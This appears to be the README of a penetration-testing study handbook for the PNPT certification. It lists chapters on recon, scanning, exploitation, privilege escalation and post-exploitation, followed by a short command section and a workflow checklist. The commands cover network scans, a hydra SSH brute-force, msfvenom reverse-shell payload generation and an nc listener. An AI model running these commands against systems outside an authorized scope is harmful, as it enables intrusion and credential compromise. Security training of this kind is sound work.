# TCM PNPT PENTESTING HANDBOOK

Quick reference guide for pentesting engagements. Commands marked with `$` are for command line execution.

## Table of Contents

### 0-Foundation
- [**01-QUICK-START**](0-Foundation/01-QUICK-START.md) - 5 stages, workflow checklist, common ports
- [**02-NETWORKING**](0-Foundation/02-NETWORKING.md) - OSI model, TCP/UDP, IPv4/IPv6, subnetting
- [**03-TOOLS-RESOURCES**](0-Foundation/03-TOOLS-RESOURCES.md) - Tools by phase, useful links, common ports

### 1-Reconnaissance
- [**01-PASSIVE-RECON**](1-Reconnaissance/01-PASSIVE-RECON.md) - OSINT tools, company info, no active scanning
- [**02-EMAIL-CREDENTIALS**](1-Reconnaissance/02-EMAIL-CREDENTIALS.md) - Email discovery, breach databases, credential harvesting

### 2-Scanning
- [**01-SUBDOMAIN-TECH**](2-Scanning/01-SUBDOMAIN-TECH.md) - Subdomain discovery, tech stack identification
- [**02-NMAP**](2-Scanning/02-NMAP.md) - Port scanning, service enumeration
- [**03-VULN-SCANNING**](2-Scanning/03-VULN-SCANNING.md) - Nessus, SearchSploit, CVE research
- [**04-HTTP-ENUMERATION**](2-Scanning/04-HTTP-ENUMERATION.md) - Web servers, directories, Nikto, Burp Suite
- [**05-SMB-ENUMERATION**](2-Scanning/05-SMB-ENUMERATION.md) - Windows shares, SMB version checking
- [**06-SSH-ENUMERATION**](2-Scanning/06-SSH-ENUMERATION.md) - SSH versions, weak algorithms, brute force
- [**07-DNS-OTHER-SERVICES**](2-Scanning/07-DNS-OTHER-SERVICES.md) - DNS, NFS, Telnet, hash identification

### 3-Exploitation
- [**01-BRUTE-FORCE**](3-Exploitation/01-BRUTE-FORCE.md) - Hydra, credential stuffing, password spraying
- [**02-METASPLOIT**](3-Exploitation/02-METASPLOIT.md) - MSFConsole basics, exploit workflow
- [**03-REVERSE-SHELLS**](3-Exploitation/03-REVERSE-SHELLS.md) - Shell types, MSFVenom, one-liners
- [**04-WEB-EXPLOITATION**](3-Exploitation/04-WEB-EXPLOITATION.md) - PHP shells, SQLi, LFI/RFI, file uploads
- [**05-ACTIVE-DIRECTORY**](3-Exploitation/05-ACTIVE-DIRECTORY.md) - LLMNR poisoning, Kerberoasting, PTH

### 4-Privesc
- [**01-PRIVESC**](4-Privesc/01-PRIVESC.md) - Linux/Windows privesc, SUID, sudo, UAC bypass

### 5-PostExploitation
- [**01-POST-EXPLOITATION**](5-PostExploitation/01-POST-EXPLOITATION.md) - File transfer, data exfil, log cleanup
- [**02-FILE-CRACKING**](5-PostExploitation/02-FILE-CRACKING.md) - ZIP cracking, hash identification, John/Hashcat

### Reference
- [**01-BURP-SUITE**](Reference/01-BURP-SUITE.md) - Setup, intercepting, testing, scanning
- [**02-CHEATSHEET**](Reference/02-CHEATSHEET.md) - All commands in one place
- [**03-REPORTING-LEGAL**](Reference/03-REPORTING-LEGAL.md) - Documentation, scope, legal considerations

## Directory Structure

## Directory Structure

```
notes/
├── README.md
├── 0-Foundation/
│   ├── 01-QUICK-START.md
│   ├── 02-NETWORKING.md
│   └── 03-TOOLS-RESOURCES.md
├── 1-Reconnaissance/
│   ├── 01-PASSIVE-RECON.md
│   └── 02-EMAIL-CREDENTIALS.md
├── 2-Scanning/
│   ├── 01-SUBDOMAIN-TECH.md
│   ├── 02-NMAP.md
│   ├── 03-VULN-SCANNING.md
│   ├── 04-HTTP-ENUMERATION.md
│   ├── 05-SMB-ENUMERATION.md
│   ├── 06-SSH-ENUMERATION.md
│   └── 07-DNS-OTHER-SERVICES.md
├── 3-Exploitation/
│   ├── 01-BRUTE-FORCE.md
│   ├── 02-METASPLOIT.md
│   ├── 03-REVERSE-SHELLS.md
│   ├── 04-WEB-EXPLOITATION.md
│   └── 05-ACTIVE-DIRECTORY.md
├── 4-Privesc/
│   └── 01-PRIVESC.md
├── 5-PostExploitation/
│   ├── 01-POST-EXPLOITATION.md
│   └── 02-FILE-CRACKING.md
└── Reference/
    ├── 01-BURP-SUITE.md
    ├── 02-CHEATSHEET.md
    └── 03-REPORTING-LEGAL.md
```

---

**Discovery:**
```bash
$ arp-scan -l
$ netdiscover -r 192.168.1.0/24
$ nmap -T4 -p- 192.168.1.100
```

**Web:**
```bash
$ nikto -h http://192.168.1.100
$ ffuf -w wordlist.txt:FUZZ -u http://192.168.1.100/FUZZ
```

**Brute Force:**
```bash
$ hydra -l admin -P wordlist.txt ssh://192.168.1.100:22 -t 4 -V
```

**Shells:**
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
$ nc -nvlp 4444
```

**Privesc:**
```bash
$ sudo -l
$ ./linpeas.sh
```

---

## Common Vulnerabilities to Test For

- **SQL Injection** - User input in database queries
- **XSS** - Unescaped user input in web pages
- **CSRF** - State-changing requests without tokens
- **LFI/RFI** - File inclusion vulnerabilities
- **Weak Auth** - Default credentials, brute-forceable passwords
- **Misconfiguration** - Open shares, weak permissions, exposed backups
- **Outdated Software** - Known CVEs with public exploits
- **Privilege Escalation** - SUID binaries, sudo misconfig, DLL hijacking

---

## Workflow Checklist

- [ ] Gather scope & authorization documents
- [ ] Passive reconnaissance (emails, subdomains)
- [ ] Active scanning (Nmap, Nessus)
- [ ] Service enumeration (versions, tech stack)
- [ ] Vulnerability research (CVEs, exploits)
- [ ] Exploitation attempts
- [ ] Privilege escalation
- [ ] Post-exploitation (data extraction, persistence)
- [ ] Documentation & reporting
- [ ] Cleanup (remove backdoors, clear logs)

---

**Last Updated:** January 2026  
**Framework:** TCM PNPT  
**Purpose:** Portable reference for pentesting engagements

